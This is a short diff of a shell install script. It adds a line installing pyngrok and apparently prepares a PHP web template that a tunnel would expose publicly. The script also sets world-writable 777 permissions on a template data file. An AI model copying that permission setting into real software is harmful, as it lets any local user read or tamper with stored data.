@@ -11,6 +11,7 @@ apt-get -y install openssh &>> install.log
 echo '    Requests'
 pip3 install requests &>> install.log
 pip3 install vk_api &>> install.log
+pip3 install pyngrok &>> install.log
 echo
 echo '[!] Setting Permissions...'
 chmod 777 template/nearyou/php/info.txt
